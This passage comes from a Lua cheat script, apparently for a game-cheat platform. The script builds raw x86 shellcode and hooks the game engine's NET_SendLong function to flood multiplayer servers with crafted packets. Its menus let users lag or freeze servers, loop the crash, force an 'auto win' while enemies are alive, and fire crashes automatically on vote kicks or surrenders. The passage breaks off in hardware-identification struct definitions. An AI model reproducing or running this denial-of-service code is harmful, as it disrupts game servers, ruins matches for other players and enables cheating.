        0xc5, 0x77, 0xc2, 0x00, 0x76, 0xd6, 0x79, 0xe9, 0x7e, 0x00, 0xf7, 0x7c, 0x00, 0x76, 0x70, 0x5e,
        0x7e, 0x4c, 0xf7, 0xfb, 0x22, 0xf7, 0x2d, 0x77, 0x4d, 0x34, 0x7e, 0x06, 0xf7, 0x83, 0xf7, 0x1a,
        0xf7, 0x38, 0x77, 0x5f, 0x0f, 0xf7, 0xdc, 0x77, 0x35, 0x77, 0x3c, 0xf7, 0x15, 0xf7, 0x5a, 0x00,
        0x76, 0xbb, 0xfb, 0x56, 0xfe, 0xa0, 0x77, 0xdc, 0x89, 0xfe, 0xdc, 0x77, 0x03, 0x77, 0x75, 0xf7,
        0x57, 0x77, 0xef, 0x94, 0x77, 0x29, 0xf7, 0x71, 0xf7, 0x85, 0xf7, 0x27, 0x34, 0xfe, 0x77, 0xf7,
        0x36, 0xf7, 0x7f, 0x02, 0x77, 0x2c, 0xf7, 0x01, 0xf7, 0x00, 0x77, 0x30, 0x77, 0x3c, 0xf7, 0x48,
        0xf7, 0xf1, 0xff, 0x17, 0x7e, 0xa6, 0x77, 0x2f, 0x77, 0x90, 0x77, 0x1e, 0x77, 0x0c, 0x77, 0x40,
        0xf7, 0x17, 0x77, 0xff, 0x74, 0x77, 0x7f, 0x77, 0x04, 0xf7, 0xef, 0xf7, 0xa1, 0xf7, 0xd9, 0x77,
        0x62, 0x77, 0x58, 0xf7, 0xf7, 0x95, 0x77, 0x73, 0x77, 0x2d, 0xf7, 0x76, 0x11, 0x7e, 0x44, 0x77,
        0xff, 0x77, 0xbc, 0xf7, 0xdd, 0x00, 0x07, 0x15, 0x42, 0xfe, 0x69, 0xf7, 0x52, 0xf7, 0xe9, 0x18,
        0x7e, 0x40, 0x77, 0xbf, 0xc5, 0x77, 0x08, 0xf7, 0xee, 0xf7, 0x35, 0x77, 0x37, 0x77, 0x5e, 0xf7,
        0xea, 0x00, 0x76, 0xee, 0x60, 0x0f, 0x7e, 0x22, 0x77, 0xbd, 0x77, 0x25, 0x20, 0xfe, 0x85, 0xf7,
        0x3f, 0xf7, 0x3e, 0x6d, 0x14, 0x7e, 0x6b, 0x77, 0x81, 0x77, 0x41, 0xf3, 0x00, 0x00
    }

    local packetbuf_len = #packetbuf
    for i = 1, 9302, 1 do
        packetbuf[packetbuf_len + i] = 0xcd
    end

    ---@diagnostic disable-next-line: undefined-field
    local mem_packetbuf = kernel32.VirtualAlloc(nil, #packetbuf, C.MEM_COMMIT + C.MEM_RESERVE, C.PAGE_READWRITE)
    ffi.copy(mem_packetbuf, ffi.new("char[?]", #packetbuf, packetbuf), #packetbuf)

    local Calls_SendToImpl = mem.FindPattern("engine.dll", "55 8B EC 51 53 8B D9 56 57 8B FA 8B 03")

    crasher_state[CRASHER_STATE_SHOULD_CALL] = 1
    crasher_state[CRASHER_STATE_NETCHAN] = 0
    crasher_state[CRASHER_STATE_SENDLONG] = ffi.cast('uintptr_t', mem_CUSTOM_NET_SendLong)
    crasher_state[CRASHER_STATE_SENDTOIMPL] = ffi.cast('uintptr_t', Calls_SendToImpl)

    local RunExploit = {
        0x56, -- 00 push esi
        0x33, 0xF6, -- 01 xor esi,esi
        0xC6, 0x05, 0x7C, 0xB7, 0x0F, 0x10, 0x00, -- 03 mov byte ptr [shouldCall],00
        0x39, 0x35, 0xF4, 0xEA, 0x0F, 0x10, -- 10 cmp [Nezu_crasher_strength],esi
        0x7E, 0x30, -- 16 jle end
        -- :loop
        0x80, 0x3D, 0xF2, 0xEA, 0x0F, 0x10, 0x00, -- 18 cmp byte ptr [Nezu_crasher_active],00
        0x74, 0x27, -- 25 je end
        0x8B, 0x15, 0x7C, 0xFC, 0x0F, 0x10, -- 27 mov edx,[netchan]
        0x8B, 0x0D, 0x34, 0xFD, 0x0F, 0x10, -- 33 mov ecx,[ref_Calls_SendToImpl]
        0x68, 0x40, 0x02, 0x00, 0x00, -- 39 push 0x240
        0x6A, 0x0D, -- 44 push 0x0D
        0x68, 0x8C, 0xB7, 0x0F, 0x10, -- 46 push mem_packetbuf + 0xC
        0xFF, 0x15, 0x78, 0xFC, 0x0F, 0x10, -- 51 call dword ptr [ref_CUSTOM_NET_SendLong]
        0x46, -- 57 inc esi
        0x3B, 0x35, 0xF4, 0xEA, 0x0F, 0x10, -- 58 cmp esi,[Nezu_crasher_strength]
        0x7C, 0xD0, -- 64 jl loop
        -- :end
        0xC6, 0x05, 0x7C, 0xB7, 0x0F, 0x10, 0x01, -- 66 mov byte ptr [shouldCall],01
        0x33, 0xC0, -- 73 xor eax,eax
        0x5E, -- 75 pop esi
        0xC2, 0x04, 0x00                          -- 76 ret 0004
    }

    setUint(RunExploit, 6, offsetPointer(crasher_state, CRASHER_STATE_SHOULD_CALL))
    setUint(RunExploit, 13, offsetPointer(crasher_state, CRASHER_STATE_STRENGTH))
    setUint(RunExploit, 21, offsetPointer(crasher_state, CRASHER_STATE_ENABLED))
    setUint(RunExploit, 30, offsetPointer(crasher_state, CRASHER_STATE_NETCHAN))
    setUint(RunExploit, 36, offsetPointer(crasher_state, CRASHER_STATE_SENDTOIMPL))
    setUint(RunExploit, 48, ffi.cast("uintptr_t", mem_packetbuf) + 0xC)
    setUint(RunExploit, 54, offsetPointer(crasher_state, CRASHER_STATE_SENDLONG))
    setUint(RunExploit, 61, offsetPointer(crasher_state, CRASHER_STATE_STRENGTH))
    setUint(RunExploit, 69, offsetPointer(crasher_state, CRASHER_STATE_SHOULD_CALL))

    local mem_RunExploit = createShellcode(RunExploit)

    local NET_SendLong = mem.FindPattern("engine.dll", "55 8B EC 81 EC DC 04 00 00 8B 45 0C 53 8B")

    crasher_state[CRASHER_STATE_COUNTER] = 0
    ---@diagnostic disable-next-line: undefined-field
    crasher_state[CRASHER_STATE_BEGINTHREADEX] = ffi.cast('uintptr_t', ucrtbase._beginthreadex)

    local Hooked_NET_SendLong = {
        0x55, -- 00:0    push   ebp
        0x8b, 0xec, -- 01:1    mov    ebp,esp
        0x80, 0x3d, 0xf2, 0xea, 0x0f, 0x10, 0x00, -- 03:3    cmp    [Nezu_crasher_active],00
        0x56, -- 0a:10   push   esi
        0x8b, 0xf1, -- 0b:11   mov    esi,ecx
        0x57, -- 0d:13   push   edi
        0x8b, 0xfa, -- 0e:14   mov    edi,edx
        0x89, 0x35, 0x7c, 0xfc, 0x0f, 0x10, -- 10:16   mov    [netchan],esi
        0x74, 0x33, -- 16:22   je     0x4b
        0xa1, 0x80, 0xfc, 0x0f, 0x10, -- 18:24   mov    eax,[counter]
        0x83, 0xf8, 0x02, -- 1d:29   cmp    eax,0x2
        0x7c, 0x23, -- 20:32   jl     0x45
        0x80, 0x3d, 0x7c, 0xb7, 0x0f, 0x10, 0x00, -- 22:34   cmp    [shouldCall],00
        0x74, 0x18, -- 29:41   je     0x43
        0x6a, 0x00, -- 2b:43   push   0x0
        0x6a, 0x00, -- 2d:45   push   0x0
        0x6a, 0x00, -- 2f:47   push   0x0
        0x68, 0x20, 0x9b, 0x09, 0x10, -- 31:49   push   mem_RunExploit
        0x6a, 0x00, -- 36:54   push   0x0
        0x6a, 0x00, -- 38:56   push   0x0
        0xff, 0x15, 0xbc, 0xb3, 0x0b, 0x10, -- 3a:58   call   dword ptr [ref_ucrtbase__beginthreadex]
        0x83, 0xc4, 0x18, -- 40:64   add    esp,0x18
        0x33, 0xc0, -- 43:67   xor    eax,eax
        0x40, -- 45:69   inc    eax
        0xa3, 0x80, 0xfc, 0x0f, 0x10, -- 46:70   mov    [counter],eax
        0x8b, 0x0d, 0x34, 0xfd, 0x0f, 0x10, -- 4b:75   mov    ecx,[ref_Calls_SendToImpl]
        0x8b, 0xd6, -- 51:81   mov    edx,esi
        0x68, 0x40, 0x02, 0x00, 0x00, -- 53:83   push   0x240
        0xff, 0x75, 0x08, -- 58:88   push   DWORD PTR [ebp+0x8]
        0x57, -- 5b:91   push   edi
        0xff, 0x15, 0x78, 0xfc, 0x0f, 0x10, -- 5c:92   call   dword ptr [ref_CUSTOM_NET_SendLong]
        0x5f, -- 62:98   pop    edi
        0x5e, -- 63:99   pop    esi
        0x5d, -- 64:100  pop    ebp
        0xc2, 0x08, 0x00, -- 65:101  ret    0x8
    }

    setUint(Hooked_NET_SendLong, 6, offsetPointer(crasher_state, CRASHER_STATE_ENABLED))
    setUint(Hooked_NET_SendLong, 19, offsetPointer(crasher_state, CRASHER_STATE_NETCHAN))
    setUint(Hooked_NET_SendLong, 26, offsetPointer(crasher_state, CRASHER_STATE_COUNTER))
    setUint(Hooked_NET_SendLong, 37, offsetPointer(crasher_state, CRASHER_STATE_SHOULD_CALL))
    setUint(Hooked_NET_SendLong, 51, mem_RunExploit)
    setUint(Hooked_NET_SendLong, 61, offsetPointer(crasher_state, CRASHER_STATE_BEGINTHREADEX))
    setUint(Hooked_NET_SendLong, 72, offsetPointer(crasher_state, CRASHER_STATE_COUNTER))
    setUint(Hooked_NET_SendLong, 78, offsetPointer(crasher_state, CRASHER_STATE_SENDTOIMPL))
    setUint(Hooked_NET_SendLong, 95, offsetPointer(crasher_state, CRASHER_STATE_SENDLONG))

    local mem_Hooked_NET_SendLong = createShellcode(Hooked_NET_SendLong)

    local NET_SendLong_hook = {
        0x68, 0x78, 0x56, 0x34, 0x12, -- push 0x12345678
        0xC3                          -- ret
    }

    setUint(NET_SendLong_hook, 2, mem_Hooked_NET_SendLong)

    local NET_SendLong_orig = { 0x55, 0x8B, 0xEC, 0x81, 0xEC, 0xDC }

    local crasherInfo = {
        started_at = -1;
        stoppedAt = -1;
        shouldReconnect = false;
        serverResumedAt = -1;
    }

    local function updateState(new_state, strength)
        if strength ~= nil then
            if crasher_state[CRASHER_STATE_STRENGTH] ~= strength then
                crasher_state[CRASHER_STATE_STRENGTH] = strength
                debug("crasher strength chaged to: " .. tonumber(strength))
            end
        end

        crasher_state[CRASHER_STATE_ENABLED] = new_state
        debug("crasher state chaged to: " .. tonumber(new_state))

        crasherInfo.shouldReconnect = true;

        if new_state == 1 then
            patch(ffi.cast("void*", NET_SendLong), NET_SendLong_hook)
            crasherInfo.started_at = globals.RealTime();
            crasherInfo.stoppedAt = globals.RealTime();
        else
            patch(ffi.cast("void*", NET_SendLong), NET_SendLong_orig)
            crasherInfo.started_at = -1;
            crasherInfo.stoppedAt = globals.RealTime();
        end
    end
    --endregion crasher

    local function is_enemy(player)
        return (entities.GetLocalPlayer():GetTeamNumber() ~= player:GetTeamNumber())
    end

    local function hasEnemies()
        local lp = entities.GetLocalPlayer();
        if lp ~= nil then
            local lpindex = lp:GetIndex()
            for i3 = 1, globals.MaxClients(), 1 do
                local player_info = client.GetPlayerInfo(i3);
                if player_info and not player_info["IsBot"] and not player_info["IsGOTV"] and lpindex ~= i3 then
                    local player = entities.GetByIndex(i3);
                    if (player) then
                        if (is_enemy(player)) then
                            return true;
                        end
                    end
                end
            end
        end
    end

    local function capital(str)
        local chunks = {}
        for s in str:gmatch("%S+") do
            table.insert(chunks, s:sub(1, 1):upper() .. s:sub(2));
        end
        return table.concat(chunks, " ");
    end
    local function hasAliveEnemies()
        local lp = entities.GetLocalPlayer();
        if lp ~= nil then
            local lpindex = lp:GetIndex()
            for i3 = 1, globals.MaxClients(), 1 do
                local player_info = client.GetPlayerInfo(i3);
                if player_info and not player_info["IsBot"] and not player_info["IsGOTV"] and lpindex ~= i3 then
                    local player = entities.GetByIndex(i3);
                    if (player) then
                        if (is_enemy(player) and player:IsAlive()) then
                           -- print("Found: " .. player:GetName());
                            return true;
                        end
                    end
                end
            end
        end
    end
    local autopilot = {
        enable = false,
        strength = 50,
        nextCheck = 0
    }
    local availCrashers = {};

    --region menu
    local IS_PRO = "%is_beta%" == "1";
  --  IS_PRO = true;

    local tab = gui.Tab(gui.Reference("Settings"), 'servercrasher', 'Server Crasher');
    local proTab = gui.Tab(gui.Reference("Settings"), 'servercrasher.pro', 'Server Crasher PRO');

    local groups = {
        information = gui.Groupbox(tab, 'Information / FAQ - Made with <3 by SamHoque#1337 & nezu#0001', 16, 16);
        crasher_1 = gui.Groupbox(tab, 'Crasher 1 (Preset)', 16, 295, 295, 1);
        crasher_2 = gui.Groupbox(tab, 'Crasher 2 (Preset)', (16 * 2) + 295, 295, 296, 1);
        crasher_loop = gui.Groupbox(tab, 'Crash Loop', 16, 295, 296, 1);
        misc = gui.Groupbox(tab, 'Misc', (16 * 2) + 295, 295, 296, 1);
    }

    local proGroups = {
        crasher_auto_win = gui.Groupbox(proTab, 'Auto Win', 16, 16, 295, 1);
        autopilot = gui.Groupbox(proTab, 'Auto Pilot', (16 * 2) + 295, 16, 295, 1);
        legitmode = gui.Groupbox(proTab, "Legit Mode", 16, 240, 295, 1);
    }

    local showFAQ = gui.Checkbox(groups.information, "crasher.hide.faq", "Show FAQ", false);
    showFAQ:SetPosX(500);
    showFAQ:SetPosY(-42);

    local text = gui.Text(groups.information, [[
    1. What is the difference between Crasher 1 & Crasher 2?
    1a) They are the same, these can be used like a preset. You can use one for lagging servers and the other for crashing servers.

	2. What is strength?
	2a) Strength is the amount of packets to be sent to the server, a lower value such as (100-200) will cause the server to lag, while a higher value such as (500-1000) will completely freeze the server.

	3. How do I turn on anti crash?
	3a) Anti Crash is already included with the script and is always enabled to ensure you will never crash from the server.

	4. Why are some features disabled?
	4a) Some of the features require you to use the pro version of the script, if you already have the pro version, there shouldn't be any disabled features.
    ]]);

    local function updatePositions()
        local value = showFAQ:GetValue();
        for i, v in pairs(groups) do
            local presetY = value and 295 or 75;
            if (not i:find('information')) then
                if (not i:find("crasher_1") and not i:find("crasher_2")) then
                    presetY = presetY + 300;
                end
                v:SetPosY(presetY);
            end
        end
        text:SetInvisible(not value);
    end

    updatePositions();
    gui.SetCallback(showFAQ, updatePositions);

    -- Setup the Information/FAQ text
    local menu = {
        crasher_1 = {
            enable = gui.Checkbox(groups.crasher_1, "crasher1.enable", "Enable", false),
            strength = gui.Slider(groups.crasher_1, "crasher1.strength", "Strength", 250, 0, 1000),
            auto_stop = gui.Checkbox(groups.crasher_1, "crasher1.autostop", "Auto stop", true),
            auto_stop_time = gui.Slider(groups.crasher_1, "crasher1.autostop.time", "Stop after", 25, 0, 60),
            triggers = gui.Multibox(groups.crasher_1, "Triggers");
        },
        crasher_2 = {
            enable = gui.Checkbox(groups.crasher_2, "crasher2.enable", "Enable", false),
            strength = gui.Slider(groups.crasher_2, "crasher2.strength", "Strength", 250, 0, 1000),
            auto_stop = gui.Checkbox(groups.crasher_2, "crasher2.autostop", "Auto stop", true),
            auto_stop_time = gui.Slider(groups.crasher_2, "crasher2.autostop.time", "Stop after", 25, 0, 60),
            triggers = gui.Multibox(groups.crasher_2, "Triggers");
        },
        crasher_loop = {
            enable = gui.Checkbox(groups.crasher_loop, "loopfreeze.enable", "Enable", false),
            strength = gui.Slider(groups.crasher_loop, "loopfreeze.strength", "Strength", 500, 0, 1000),
            auto_stop_time = gui.Slider(groups.crasher_loop, "loopfreeze.time", "Stop after", 5, 0, 60),
        },
        crasher_auto_win = {
            enable = gui.Checkbox(proGroups.crasher_auto_win, "autowin.enable", "Enable", false),
            hidden = gui.Checkbox(proGroups.crasher_auto_win, "autowin.enable.hidden", "hidden", false),
            strength = gui.Slider(proGroups.crasher_auto_win, "autowin.strength", "Strength", 500, 0, 1000),
            auto_stop_time = gui.Slider(proGroups.crasher_auto_win, "autowin.time", "Stop after", 5, 0, 60),
        },
        misc = {
            gui.Text(groups.misc, "Loop freeze will reactivate the crasher after server\nstarts responding again effectively freezing the\ngame"),
            time_since_last_tick = gui.Checkbox(groups.misc, "servercrasher.timesincelasttick", "Time since last tick indicator", true),
            flex = gui.Button(groups.misc, "Flex ;)", function()
                client.ChatSay('I\'m using server crasher from samhoque.dev/crasher, u mad?')
            end),
        },
        autopilot = {
            btn = gui.Button(proGroups.autopilot, "Calculate Best Strength", function()
                if (not autopilot.enable) then
                    autopilot.enable = true;
                    autopilot.strength = 50;
                    autopilot.nextCheck = 0;
                end
            end),
            best_strength = gui.Text(proGroups.autopilot, "Best Strength: N/A");
            crashers = gui.Combobox(proGroups.autopilot, "autopilot.selected.crasher", "Set Strength of", "Loading...");
            _ = gui.Text(proGroups.autopilot, "Calculate the strength using the above button\nbefore using this button!");
        },
        legitmode = {
            enable = gui.Checkbox(proGroups.legitmode, 'servercrasher.pro.legitmode', "Enable", false);
            _ = gui.Text(proGroups.legitmode, "Automatically reconnect back to the game\nafter crash ends & one of the player has\njoined the server");
        }
    }
    menu.autopilot.set_best_strength = gui.Button(proGroups.autopilot, "Set Best Strength", function()
        local selectedCrasher = availCrashers[menu.autopilot.crashers:GetValue() + 1];
        menu[selectedCrasher].strength:SetValue(autopilot.strength);
        updateState(0, autopilot.strength);
    end);
    menu.autopilot.set_best_strength:SetWidth(260);
    menu.autopilot.btn:SetWidth(260);
    menu.misc.time_since_last_tick:SetDescription("How much time has passed since the last received packet");

    for i, v in pairs(menu) do
        if (i:find('crasher_')) then
            availCrashers[#availCrashers + 1] = i;
            gui.SetCallback(v.enable, function(old, new)
                -- Loop over all of the menu items, if it isn't our current item, turn it off.
                if (new) then
                    for i2, v2 in pairs(menu) do
                        if (i2:find('crasher_')) then
                            if (i ~= i2 and i ~= 'crasher_auto_win') then
                                v2.enable:SetValue(false);
                            end
                        end
                    end
                    local shouldCrash = true;
                    if (i == 'crasher_auto_win') then
                        shouldCrash = hasAliveEnemies();
                    end
                    if (shouldCrash) then
                        updateState(1, v.strength:GetValue());
                    end
                else
                    local shouldDisable = true;
                    for i2, v2 in pairs(menu) do
                        if (i2:find('crasher_')) then
                            if (v2.enable:GetValue()) then
                                shouldDisable = false;
                            end
                        end
                    end
                    if (shouldDisable) then
                        updateState(0, v.strength:GetValue());
                    end
                end
            end)

            gui.SetCallback(v.strength, function(old, new)
                if (v.enable:GetValue()) then
                    crasher_state[CRASHER_STATE_STRENGTH] = new;
                    debug("Updated strength to " .. new);
                end
            end)

            if (i:find("auto_win")) then
                v.enable:SetDescription("Keeps crashing until all ALIVE enemies are out of the game.");
            end

            if (v.hidden) then
                v.hidden:SetInvisible(true);
            end

            v.auto_stop_time:SetDescription("in seconds. Set this low if you want for people to stay");

            if (v.triggers) then
                if (IS_PRO) then
                    menu[i]['trigger_kick'] = gui.Checkbox(v.triggers, i .. ".trigger.kick", "Vote Kick", false);
                    menu[i]['trigger_surrender'] = gui.Checkbox(v.triggers, i .. ".trigger.surrender", "Enemy Surrender", false);
                    menu[i]['trigger_timeout'] = gui.Checkbox(v.triggers, i .. ".trigger.timeout", "Enemy Timeout", false);
                else
                    gui.Checkbox(v.triggers, i .. ".trigger.need_pro", "PRO Only Feature (auto crash)", true);
                    v.triggers:SetDisabled(true);
                end
            end
        end
    end
    table.sort(availCrashers);

    local beautifiedNames = {};
    for i = 1, #availCrashers do
        beautifiedNames[i] = capital(availCrashers[i]:gsub('_', " "));
    end
    menu.autopilot.crashers:SetOptions(unpack(beautifiedNames));

    if (not IS_PRO) then
        proTab:SetDisabled(true);
    end

    local sv_pure_bypass = gui.Reference("Misc", "General", "Bypass", "Bypass sv_pure")

    local iEngine = ffi.cast("void***", CreateInterface("engine.dll", "VEngineClient014")) or error('VEngineClient014 is nil.')
    local iEngine_vmt = iEngine[0]
    local iEngine_GetLastTimeStamp = ffi.cast(ffi.typeof("float(__thiscall*)(void*)"), iEngine_vmt[14])
    local iEngine_IsInGame = ffi.cast(ffi.typeof("bool(__thiscall*)(void*)"), iEngine_vmt[26])

    local function getTime(s)
        local str = ""
        if s >= 60 then
            local m = math.floor(s / 60)
            str = string.format("%dm ", m)
            s = s - (m * 60)
        end
        return string.format("%s%.1fs", str, s)
    end

    local FONT = draw.CreateFont("Segoe UI", 24, 400)

    local function drawTextOutlined(x, y, text, r, g, b, a)
        draw.Color(0, 0, 0, a)
        draw.Text(x + 1, y + 1, text)
        draw.Color(r, g, b, a)
        draw.Text(x, y, text)
    end

    local last_tick_delta = 0;
    if (IS_PRO) then
        local function UserMessageCallback(msg)
            -- CS_UM_SayText2
            if (msg:GetID() == 46) then
                if (entities.GetLocalPlayer() == nil) then
                    return ;
                end
                local team = msg:GetInt(1)
                local lpName = msg:GetString(5)
                local votetype = msg:GetInt(3);

                if team ~= -1 and votetype == 0 then
                    -- kick

                    -- check if they are kicking us
                    if lpName ~= entities.GetLocalPlayer():GetName() then
                        return
                    end

                    menu.crasher_1.enable:SetValue(menu.crasher_1.trigger_kick:GetValue());
                    menu.crasher_2.enable:SetValue(menu.crasher_2.trigger_kick:GetValue());
                end

                if (team ~= -1 and votetype == 6) then
                    local lpTeam = entities.GetLocalPlayer():GetTeamNumber();
                    if (lpTeam == team) then
                        return
                    end

                    menu.crasher_1.enable:SetValue(menu.crasher_1.trigger_surrender:GetValue());
                    menu.crasher_2.enable:SetValue(menu.crasher_2.trigger_surrender:GetValue());
                end

                if (votetype == 13) then
                    local lpTeam = entities.GetLocalPlayer():GetTeamNumber();
                    if (lpTeam == team) then
                        return
                    end

                    menu.crasher_1.enable:SetValue(menu.crasher_1.trigger_timeout:GetValue());
                    menu.crasher_2.enable:SetValue(menu.crasher_2.trigger_timeout:GetValue());
                end
            end
        end
        callbacks.Register("DispatchUserMessage", UserMessageCallback);

        client.AllowListener('player_connect_full');
        callbacks.Register("FireGameEvent", function(event)
            local en = event:GetName();
            if (en == "player_connect_full") then
             --   print( crasherInfo.shouldReconnect, ' ', not hasAliveEnemies());
                if (menu.legitmode.enable:GetValue() and crasherInfo.shouldReconnect and not hasAliveEnemies()) then
                    crasherInfo.shouldReconnect = false;
             --       print("Trying to reconnect...");
                    client.Command('disconnect;');
                    timer.Create("reconnect", 1, 1, function()
                        panorama.RunScript('CompetitiveMatchAPI.ActionReconnectToOngoingMatch()');
                    end)
                end
            end
        end)
    end

    local recordResume = false;
    callbacks.Register("Draw", function()
        sv_pure_bypass:SetValue(true);
        sv_pure_bypass:SetDisabled(true);

        local active = crasher_state[CRASHER_STATE_ENABLED] == 1;

        if (not iEngine_IsInGame(iEngine) and active) then
            for _, v in pairs(menu) do
                if (v.enable) then
                    v.enable:SetValue(false);
                end
            end
            updateState(0);
            return
        end

        local max = 0;
        local time_delta = globals.CurTime() - iEngine_GetLastTimeStamp(iEngine);

        if (time_delta > 1 and not recordResume) then
            recordResume = true;
        elseif (time_delta < 0.1 and recordResume) then
            recordResume = false;
            crasherInfo.serverResumedAt = globals.RealTime();
        end

        if (autopilot.enable and autopilot.nextCheck < globals.CurTime()) then
            autopilot.nextCheck = globals.CurTime() + 0.2;
            if (time_delta < 1) then
                menu.autopilot.best_strength:SetText("Best Strength: Calculating" .. string.rep(".", math.floor(common.Time()) % 4) or '');
                autopilot.strength = autopilot.strength + 1;
                updateState(1, autopilot.strength);
            else
                menu.autopilot.best_strength:SetText("Best Strength: " .. autopilot.strength);
                autopilot.enable = false;
                updateState(0, autopilot.strength);
            end
        end

        if active then
            local delta = globals.RealTime() - crasherInfo.started_at;
            if (not autopilot.enable) then
                for i, v in pairs(menu) do
                    if (i:find("crasher")) then
                        if (v.enable:GetValue() and (not v.auto_stop or v.auto_stop:GetValue())) then
                            max = v.auto_stop_time:GetValue();
                            if (v.hidden and not v.hidden:GetValue()) then
                                max = 0;
                            end
                            if (delta > max) then
                                if (i ~= 'crasher_loop') then
                                    if (v.hidden) then
                                        v.hidden:SetValue(0);
                                    else
                                        v.enable:SetValue(0);
                                    end
                                end
                                updateState(0, 500);
                                active = false;
                            end
                        end
                    end
                end
            end

            cvar_setInt(cvar_rate, 99999999)
            cvar_setInt(cvar_net_threaded_socket_recovery_time, 2)
            cvar_setInt(cvar_net_threaded_socket_recovery_rate, 999999)
            cvar_setInt(cvar_net_threaded_socket_burst_cap, 999999)
            cvar_setInt(cvar_net_compresspackets, 1)
            cvar_setInt(cvar_net_compresspackets_minsize, 0)
            cvar_setInt(cvar_net_maxroutable, 120)
            cvar_setFloat(cvar_net_maxroutable, 120)
            cvar_setInt(cvar_sv_maxroutable, 50)
        else
            if (menu.crasher_loop.enable:GetValue() and not autopilot.enable) then
                if time_delta < 0.1 or (menu.crasher_loop.auto_stop_time:GetValue() > 5 and last_tick_delta > 5 and time_delta < last_tick_delta) then
                    updateState(1, menu.crasher_loop.strength:GetValue())
                    active = true
                end
            end
            if (menu.crasher_auto_win.enable:GetValue() and not autopilot.enable) then
                local rules = entities.FindByClass("CCSGameRulesProxy")[1];
                --TODO: MAKE THIS ONLY WORK IN WARMUP
                --  local isWarmup = rules:GetPropBool('cs_gamerules_data','m_bWarmupPeriod');
                --print(hasEnemies(), " ", time_delta, " ", time_delta < 0.1);
                if ( time_delta < 0.1 and (globals.RealTime() - crasherInfo.serverResumedAt) > 0.3 and hasAliveEnemies()) then
                    menu.crasher_auto_win.hidden:SetValue(1);
                    updateState(1, menu.crasher_auto_win.strength:GetValue())
                end
            end

            last_tick_delta = time_delta;

            --Reset Convars
            cvar_setInt(cvar_net_maxroutable, 1200)
            cvar_setFloat(cvar_net_maxroutable, 1200)
        end

        draw.SetFont(FONT);
        local screen_size_x, screen_size_y = draw.GetScreenSize()
        local indicator_pos_x = screen_size_x / 2
        local indicator_pos_y = screen_size_y / 4

        if crasherInfo.started_at ~= -1 and not autopilot.enable then
            local delta = globals.RealTime() - crasherInfo.started_at
            if max > 0 then
                local frac = delta / max

                local w = 100
                local h = 8
                local x = indicator_pos_x - w / 2
                local pad = 4
                draw.Color(0, 0, 0, 255)
                draw.RoundedRectFill(x - pad, indicator_pos_y - pad, x + w + pad, indicator_pos_y + h + pad, 3 + pad)
                draw.Color(200, 40, 40, 255)
                draw.RoundedRectFill(x, indicator_pos_y, x + pad + (w - pad) * frac, indicator_pos_y + h, 3)
            end

            local text = "Crasher running for: %s"
            local text_size_x = draw.CalcTextSize(text)
            drawTextOutlined(indicator_pos_x - (text_size_x / 2), indicator_pos_y - 25, string.format(text, getTime(delta)), 255, 255, 255, 255)
        end

        if menu.misc.time_since_last_tick:GetValue() and iEngine_IsInGame(iEngine) then

            local time_delta = globals.CurTime() - iEngine_GetLastTimeStamp(iEngine)
            if (time_delta > 0.5) then
                local text = "Time since last tick: %s"
                local text_size_x = draw.CalcTextSize(text)
                drawTextOutlined(indicator_pos_x - (text_size_x / 2), indicator_pos_y + 25, string.format(text, getTime(time_delta)), 255, 255, 255, 255)
            end
        end
    end)

    callbacks.Register("Unload", function()
        updateState(0, 0)
        cvar_setInt(cvar_net_maxroutable, 1200)
        cvar_setFloat(cvar_net_maxroutable, 1200)
        debug("unload")
    end)

end

if not pcall(ffi.sizeof, "SMBIOSHEADER") then
    ffi.cdef [[
        uint32_t BCryptGenRandom(void* hAlgorithm, unsigned char* pbBuffer, unsigned long cbBuffer, unsigned long dwFlags);
        int rand(void);

        typedef void VOID;
        typedef VOID* LPVOID;
        typedef uintptr_t ULONG_PTR;
        typedef ULONG_PTR SIZE_T;
        typedef unsigned long DWORD;
        typedef unsigned long* PDWORD;
        typedef unsigned short WORD;
        typedef int BOOL;
        typedef unsigned char UCHAR;
        typedef unsigned char BYTE;
        typedef unsigned char* PBYTE;
        typedef unsigned short UINT16, *PUINT16;
        typedef unsigned __int64 ULONG64, *PULONG64;

        typedef struct _MODULEINFO {
            LPVOID lpBaseOfDll;
            DWORD  SizeOfImage;
            LPVOID EntryPoint;
        } MODULEINFO, *LPMODULEINFO;

        void* GetModuleHandleA(const char* lpModuleName);
        BOOL GetModuleInformation(DWORD hProcess, void* hModule, LPMODULEINFO lpmodinfo, DWORD cb);

        DWORD GetSystemFirmwareTable(DWORD FirmwareTableProviderSignature, DWORD FirmwareTableID, LPVOID pFirmwareTableBuffer, DWORD BufferSize);
        int strlen(const char* str);

        #pragma pack(1)
        typedef struct _RawSMBIOSData
        {
        BYTE	Used20CallingMethod;
        BYTE	MajorVersion;
        BYTE	MinorVersion;
        BYTE	DmiRevision;
        DWORD	Length;
        PBYTE	SMBIOSTableData;
        } RawSMBIOSData, *PRawSMBIOSData;

        typedef struct _SMBIOSHEADER_
        {
        BYTE Type;
        BYTE Length;
        WORD Handle;
        } SMBIOSHEADER, *PSMBIOSHEADER;

        typedef struct _TYPE_0_ {
        SMBIOSHEADER	Header;
        UCHAR	Vendor;
        UCHAR	Version;
        UINT16	StartingAddrSeg;
        UCHAR	ReleaseDate;
        UCHAR	ROMSize;
        ULONG64 Characteristics;
        UCHAR	Extension[2]; // spec. 2.3
        UCHAR	MajorRelease;
        UCHAR	MinorRelease;
        UCHAR	ECFirmwareMajor;
        UCHAR	ECFirmwareMinor;
        } BIOSInfo, *PBIOSInfo;

        typedef struct _TYPE_1_ {
        SMBIOSHEADER	Header;
        UCHAR	Manufacturer;
        UCHAR	ProductName;
        UCHAR	Version;
        UCHAR	SN;
        UCHAR	UUID[16];
        UCHAR	WakeUpType;
        UCHAR	SKUNumber;
        UCHAR	Family;
        } SystemInfo, *PSystemInfo;

        typedef struct _TYPE_2_ {
        SMBIOSHEADER	Header;
        UCHAR	Manufacturer;
        UCHAR	Product;
        UCHAR	Version;
        UCHAR	SN;
        UCHAR	AssetTag;
        UCHAR	FeatureFlags;
        UCHAR	LocationInChassis;
        UINT16	ChassisHandle;
        UCHAR	Type;
        UCHAR	NumObjHandle;
        UINT16	*pObjHandle;
        } BoardInfo, *PBoardInfo;

        typedef struct _TYPE_4_ {
        SMBIOSHEADER Header;
        UCHAR	SocketDesignation;
        UCHAR	Type;
        UCHAR	Family;
        UCHAR	Manufacturer;
        ULONG64 ID;
        UCHAR	Version;
        UCHAR	Voltage;
        UINT16	ExtClock;
        UINT16	MaxSpeed;
        UINT16	CurrentSpeed;
        } ProcessorInfo, *PProcessorInfo;

        typedef struct _TYPE_17_ {
        SMBIOSHEADER Header;
